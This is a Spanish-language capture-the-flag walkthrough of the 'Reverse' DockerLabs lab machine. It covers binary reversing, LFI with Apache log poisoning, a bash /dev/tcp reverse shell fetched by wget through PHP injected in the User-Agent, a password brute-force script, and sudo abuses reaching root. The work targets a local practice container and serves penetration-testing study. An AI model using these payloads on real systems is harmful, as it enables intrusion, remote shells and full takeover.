---
icon: flag
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Reverse DockerLabs (intermediate)

### Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip reverse.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh reverse.tar
```

Info:

```
                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

### Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-24 09:42 EST
Nmap scan report for realgob.dl (172.17.0.2)
Host is up (0.000048s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: P\xC3\xA1gina Interactiva
MAC Address: 02:42:AC:11:00:02 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.76 seconds
```

Si entramos en la pagina vemos una bienvenida normal y corriente, pero si inspeccionamos la pagina y vamos al `javascript` veremos lo siguiente:

```
let clickCount=0;const particleContainer=document.getElementById("particles");function createParticle(t,e){const n=document.createElement("div");n.classList.add("particle");n.style.left=`${t}px`;n.style.top=`${e}px`;n.style.width=`${Math.random()*10+5}px`;n.style.height=n.style.width;n.style.animationDuration=`${Math.random()*2+1}s`;particleContainer.appendChild(n);setTimeout((()=>{n.remove()}),3e3)}document.body.addEventListener("mousemove",(t=>{createParticle(t.clientX,t.clientY)}));document.body.addEventListener("click",(function(){clickCount++;if(clickCount>=20){alert("secret_dir");clickCount=0}}));
```

Basicamente cuando nosotros hacemos click muchas veces exactamente `20` nos aparece una alerta con el mensaje `secret_dir`:

<figure><img src="../../.gitbook/assets/image (149) (1).png" alt=""><figcaption></figcaption></figure>

Si nosotros metemos en la `URL` lo siguiente:

```
URL = http://<IP>/secret_dir
```

veremos un archivo llamado `secret`, si nos lo descargamos y vemos que tipo de archivo es:

```shell
file secret
```

Info:

```
secret: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=387271a4e7dae83df80c4ca4453a3163c48d834f, for GNU/Linux 3.2.0, not stripped
```

Vemos que es una aplicacion `.elf` que si la ejecutamos vemos lo siguiente:

```shell
chmod +x secret
./secret
```

Info:

```
Introduzca la contraseña: test
Recibido...
Comprobando...
Contraseña incorrecta...
```

Vemos que esta procesando algo, si intentamos desbordar el `buffer` no lo conseguiremos, por lo que tendremos que probar otra cosa.

## Ingenieria inversa

Vamos a utilizar `Ghidra` para decompilar el binario y ver si podemos encontrar la contraseña.

```shell
ghidra
```

Esto nos abrira el programa, cargaremos el binario que queremos analizar, una vez cargado, veremos el codigo, de primeras veremos el `main` que contiene lo principal del codigo:

```c
bool main(void)

{
  char cVar1;
  basic_ostream *pbVar2;
  basic_string local_78 [32];
  duration<> local_58 [12];
  int local_4c;
  basic_string local_48 [32];
  duration<> local_28 [12];
  int local_1c [3];
  
  std::__cxx11::basic_string<>::basic_string();
                    /* try { // try from 0040473f to 004048b9 has its CatchHandler @ 004049a7 */
  pbVar2 = std::operator<<((basic_ostream *)std::cout,(basic_string *)rojo);
  pbVar2 = std::operator<<(pbVar2,&DAT_0057e092);
  std::operator<<(pbVar2,(basic_string *)reset);
  std::getline<>((basic_istream *)&std::cin,local_78);
  pbVar2 = std::operator<<((basic_ostream *)std::cout,(basic_string *)verde);
  pbVar2 = std::operator<<(pbVar2,"Recibido...");
  pbVar2 = std::operator<<(pbVar2,(basic_string *)reset);
  std::basic_ostream<>::operator<<((basic_ostream<> *)pbVar2,std::endl<>);
  pbVar2 = std::operator<<((basic_ostream *)std::cout,(basic_string *)rojo);
  pbVar2 = std::operator<<(pbVar2,"Comprobando...");
  pbVar2 = std::operator<<(pbVar2,(basic_string *)reset);
  std::basic_ostream<>::operator<<((basic_ostream<> *)pbVar2,std::endl<>);
  local_4c = 2;
  std::chrono::duration<>::duration<int,void>(local_58,&local_4c);
  std::this_thread::sleep_for<>((duration *)local_58);
  cVar1 = containsRequiredChars(local_78);
  if (cVar1 == '\0') {
                    /* try { // try from 0040491a to 00404980 has its CatchHandler @ 004049a7 */
    pbVar2 = std::operator<<((basic_ostream *)std::cout,(basic_string *)rojo);
    pbVar2 = std::operator<<(pbVar2,&DAT_0057e0f8);
    pbVar2 = std::operator<<(pbVar2,(basic_string *)reset);
    std::basic_ostream<>::operator<<((basic_ostream<> *)pbVar2,std::endl<>);
    local_1c[0] = 1;
    std::chrono::duration<>::duration<int,void>(local_28,local_1c);
    std::this_thread::sleep_for<>((duration *)local_28);
  }
  else {
    pbVar2 = std::operator<<((basic_ostream *)std::cout,(basic_string *)verde);
    pbVar2 = std::operator<<(pbVar2,&DAT_0057e0d0);
    pbVar2 = std::operator<<(pbVar2,(basic_string *)rojo);
    decodeMessage_abi_cxx11_();
                    /* try { // try from 004048c4 to 004048ef has its CatchHandler @ 00404996 */
    pbVar2 = std::operator<<(pbVar2,local_48);
    pbVar2 = std::operator<<(pbVar2,(basic_string *)reset);
    std::basic_ostream<>::operator<<((basic_ostream<> *)pbVar2,std::endl<>);
    std::__cxx11::basic_string<>::~basic_string((basic_string<> *)local_48);
  }
  std::__cxx11::basic_string<>::~basic_string((basic_string<> *)local_78);
  return cVar1 == '\0';
}
```

Aqui vemos una `funcion` interesante llamada `containsRequiredChars` que es la que verifica si la contraseña que hemos introducido es correcta o no.

Por lo que vamos a buscar el codigo de la `funcion` en el buscador donde pone `filter` de la parte izquierda del programa:

<figure><img src="../../.gitbook/assets/image (150) (1).png" alt=""><figcaption></figcaption></figure>

Seleccionando la `funcion` podremos ver en `C` en la parte de la izquierda el programa de esta `funcion` que seria el siguiente:

```c
/* containsRequiredChars(std::__cxx11::basic_string<char, std::char_traits<char>,
   std::allocator<char> > const&) */

undefined8 containsRequiredChars(basic_string *param_1)

{
  bool bVar1;
  bool bVar2;
  bool bVar3;
  bool bVar4;
  long lVar5;
  undefined8 uVar6;
  basic_regex<> local_b8 [32];
  basic_regex<> local_98 [32];
  basic_regex<> local_78 [32];
  basic_regex<> local_58 [40];
  
  bVar3 = false;
  bVar2 = false;
  bVar1 = false;
                    /* try { // try from 00404539 to 0040462e has its CatchHandler @ 004046a4 */
  std::__cxx11::basic_regex<>::basic_regex(local_b8,"@",0x10);
  bVar4 = std::regex_search<>(param_1,(basic_regex *)local_b8,0);
  if (bVar4) {
    std::__cxx11::basic_regex<>::basic_regex(local_98,"Mi",0x10);
    bVar3 = true;
    bVar4 = std::regex_search<>(param_1,(basic_regex *)local_98,0);
    if (bVar4) {
      std::__cxx11::basic_regex<>::basic_regex(local_78,"S3cRet",0x10);
      bVar2 = true;
      bVar4 = std::regex_search<>(param_1,(basic_regex *)local_78,0);
      if (bVar4) {
        std::__cxx11::basic_regex<>::basic_regex(local_58,"d00m",0x10);
        bVar1 = true;
        bVar4 = std::regex_search<>(param_1,(basic_regex *)local_58,0);
        if ((bVar4) && (lVar5 = std::__cxx11::basic_string<>::length(), lVar5 == 0xd)) {
          uVar6 = 1;
          goto LAB_00404656;
        }
      }
    }
  }
  uVar6 = 0;
LAB_00404656:
  if (bVar1) {
    std::__cxx11::basic_regex<>::~basic_regex(local_58);
  }
  if (bVar2) {
    std::__cxx11::basic_regex<>::~basic_regex(local_78);
  }
  if (bVar3) {
    std::__cxx11::basic_regex<>::~basic_regex(local_98);
  }
  std::__cxx11::basic_regex<>::~basic_regex(local_b8);
  return uVar6;
}
```

Por lo que vemos estamos viendo la contraseña en texto plano en varias partes de comparacion del programa, por lo que si las juntamos, veremos lo siguiente:

```
@MiS3cRetd00m
```

Probaremos esa contraseña en el programa.

```shell
./secret
```

Info:

```
Introduzca la contraseña: @MiS3cRetd00m
Recibido...
Comprobando...
Contraseña correcta, mensaje secreto:
ZzAwZGowYi5yZXZlcnNlLmRsCg==
```

Vemos que lo hemos conseguido y a cambio nos proporciona una cadena en `base64`, que se veria de la siguiente forma decodificado:

```
g00dj0b.reverse.dl
```

Parece ser un subdominio junto a un dominio, por lo que vamos a ingresarlo en nuestro archivo `hosts`, y posteriormente entrar a ver que nos encontramos.

```shell
nano /etc/hosts

#Dentro del nano
<IP>         g00dj0b.reverse.dl
```

Lo guardamos y pondremos lo siguiente en la `URL`:

```
URL = http://g00dj0b.reverse.dl/
```

Veremos algo tal que esto:

<figure><img src="../../.gitbook/assets/image (151) (1).png" alt=""><figcaption></figcaption></figure>

## Local File Inclusion (LFI)

Si nos metemos en el siguiente `link` llamado `experimentos interactivos` veremos una `URL` asi:

```
URL = http://g00dj0b.reverse.dl/experiments.php?module=./modules/default.php
```

Por lo que probaremos a poner `/etc/passwd` ya que tiene pinta de que puede ser vulnerable.

```
URL = http://g00dj0b.reverse.dl/experiments.php?module=/etc/passwd
```

Info:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
Debian-exim:x:100:108::/var/spool/exim4:/usr/sbin/nologin
maci:x:1000:1000:macimo,,,:/home/maci:/bin/bash
nova:x:1001:1001:nova,,,:/home/nova:/bin/bash
```

Vemos que funciona un `LFI`, por lo que vamos a probar a realizar un `LOG POISONING`, primero veremos si podemos entrar en los logs:

### LOG POISONING

```shell
http://g00dj0b.reverse.dl/experiments.php?module=/var/log/apache2/access.log
```

Info:

```
172.17.0.1 - - [24/Dec/2024:17:23:34 +0000] "GET /experiments.php?module=/var/log/apache2/access.log HTTP/1.1" 200 446 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
```

Veremos que si podemos entrar, por lo que probaremos a poner un `whoami` a ver si funciona:

```shell
curl -s -X GET 'http://g00dj0b.reverse.dl' -H "User-Agent:<?php system('whoami'); ?>"
```

Ahora si recargamos la pagina, veremos lo sisguiente:

```
172.17.0.1 - - [24/Dec/2024:17:30:05 +0000] "GET / HTTP/1.1" 200 1423 "-" "www-data
```

Vemos que se nos esta ejecutando, por lo que nos haremos una `reverse shell` de la siguiente forma:

> shell.sh

```shell
#!/bin/bash

bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
```

Creamos ese archivo y abriremos un servidor de `python3` para pasarnos el archivo.

```shell
python3 -m http.server
```

Por lo que pondremos lo siguiente:

```shell
curl -s -X GET 'http://g00dj0b.reverse.dl' -H "User-Agent:<?php system('wget http://<IP>:8000/shell.sh'); ?>"
```

Y cuando recarguemos la pagina es cuando se va a ejecutar el comando, por lo que la recargamos y si vamos al server de `python3` vemos que ha funcionado por que veremos lo siguiente:

```
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
172.17.0.2 - - [24/Dec/2024 12:36:44] "GET /shell.sh HTTP/1.1" 200 -
```

Vemos que lo ha pillado, ahora le pondremos permisos de ejecuccion de la siguiente forma:

```shell
curl -s -X GET 'http://g00dj0b.reverse.dl' -H "User-Agent:<?php system('chmod +x shell.sh'); ?>"
```

Ahora lo ejecutaremos, pero antes nos pondremos a la escucha:

```shell
nc -lvnp <PORT>
```

Y ponemos lo siguiente:

```shell
curl -s -X GET 'http://g00dj0b.reverse.dl' -H "User-Agent:<?php system('bash shell.sh'); ?>"
```

Recargamos la pagina y si vamos a donde tenemos la escucha, veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [192.168.5.186] from (UNKNOWN) [172.17.0.2] 42806
bash: cannot set terminal process group (24): Inappropriate ioctl for device
bash: no job control in this shell
┌──[www-data@71c36e1f8f71]─[/var/www/subdominio]
└──╼ $ whoami
whoami
www-data
```

Por lo que vemos ha funcionado, ahora sanitizaremos la `TTY`.

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

## Escalate user nova

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for www-data on 71c36e1f8f71:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User www-data may run the following commands on 71c36e1f8f71:
    (nova : nova) NOPASSWD: /opt/password_nova
```

Vemos que podemos ejecutar el script `password_nova` como el usuario nova, si lo ejecutamos veremos lo siguiente:

```shell
sudo -u nova /opt/password_nova
```

Info:

```
Escribe la contraseña (Pista: se encuentra en el rockyou ;) ): test
Contraseña incorrecta.
```

Vamos a crearnos un script en `bash` que nos automatice esta tarea y pasarnos el `rockyou` a la maquina victima con `wget`.

> brute.sh

```shell
nano /tmp/brute.sh

#Dentro del nano
#!/bin/bash

# Ruta al archivo de diccionario rockyou.txt
wordlist="rockyou.txt"

# Comando que vamos a intentar ejecutar con las contraseñas
command="sudo -u nova /opt/password_nova"

# Recorremos cada palabra en el archivo de diccionario
while IFS= read -r password; do
    # Intentamos ejecutar el comando con la contraseña actual
    echo "Probando contraseña: $password"
    echo "$password" | $command
    
    # Comprobamos si el comando fue exitoso
    if [ $? -eq 0 ]; then
        echo "Contraseña encontrada: $password"
        break
    fi
done < "$wordlist"
```

Ahora nos pasaremos el `rockyou.txt`:

```shell
cd /usr/share/wordlists/
python3 -m http.server
```

Y en la maquina victima ponemos lo siguiente:

```shell
wget http://<IP>:8000/rockyou.txt
```

Con esto ya podremos ejecutar el script:

```shell
bash brute.sh
```

Info:

```
Probando contraseña: cuteangel
Escribe la contraseña (Pista: se encuentra en el rockyou ;) ): Contraseña correcta, mi contraseña es: BlueSky_42!NeonPineapple
Contraseña encontrada: cuteangel
```

Despues de un rato habremos encontrado la contraseña que seria `BlueSky_42!NeonPineapple`.

Por lo que haremos lo siguiente:

```shell
su nova
```

Metemos como contraseña `BlueSky_42!NeonPineapple` y seremos dicho usuario.

## Escalate user maci

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for nova on 71c36e1f8f71:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User nova may run the following commands on 71c36e1f8f71:
    (maci : maci) NOPASSWD: /lib64/ld-linux-x86-64.so.2
```

Vemos que podemos ejecutar `/lib64/ld-linux-x86-64.so.2` como el usuario `maci`, por lo que haremos lo siguiente:

Vamos a crear un archivo que sera el siguiente:

> malicious\_binary.c

```c
#include <stdio.h>
#include <stdlib.h>

int main() {
    setuid(0); // Hacer que el proceso tenga privilegios de root
    setgid(0); // Establecer el grupo como root
    system("/bin/bash"); // Ejecutar bash
    return 0;
}
```

Y ahora vamos a compilarlo:

```shell
gcc -o malicious_binary malicious_binary.c
```

Hecho todo esto anterior, lo ejecutaremos de la siguiente forma bajo el usuario `maci`:

```shell
sudo -u maci /lib64/ld-linux-x86-64.so.2 --library-path . ./malicious_binary
```

Y con esto ya seremos dicho usuario.

## Escalate Privileges

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for maci on 71c36e1f8f71:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User maci may run the following commands on 71c36e1f8f71:
    (ALL : ALL) NOPASSWD: /usr/bin/clush
```

Vemos que podemos ejecutar el binario `clush` bajo el usuario `root`, por lo que haremos lo siguiente:

Investigando mucho en internet vemos la siguiente pagina:

URL = [ClusterShell](https://clustershell.readthedocs.io/en/latest/tools/clush.html#reverse-file-copying-mode)

Y en un apartado de la pagina pone lo siguiente:

```
$ clush -w node[11-14] -b
Enter 'quit' to leave this interactive mode
Working with nodes: node[11-14]
clush> uname
---------------
node[11-14] (4)
---------------
Linux
clush> !pwd
LOCAL: /root
clush> -node[11,13]
Working with nodes: node[12,14]
clush> uname
---------------
node[12,14] (2)
---------------
Linux
clush>
```

Por lo que vamos a probar entrando en una `shell` interactiva y ejecutando los comandos con una `!` delante, tal y como pone en el ejemplo:

```shell
sudo clush -w node[11-14] -b
```

Info:

```
Enter 'quit' to leave this interactive mode
Working with nodes: node[11-14]
clush> !id
LOCAL: uid=0(root) gid=0(root) groups=0(root)
```

Vemos que funciona, por lo que haremos lo siguiente:

```shell
clush> !chmod u+s /bin/bash
```

Y ahora nos saldremos con `quit`, comprobaremos que ciertamente estan puestos los permisos `SUID` en las `bash`:

```shell
ls -la /bin/bash
```

Info:

```
-rwsr-xr-x 1 root root 1265648 Mar 29  2024 /bin/bash
```

Por lo que vemos a funcionado, haremos lo siguiente:

```shell
bash -p
```

Y con esto ya seremos `root`, por lo que ya la habremos termiando.
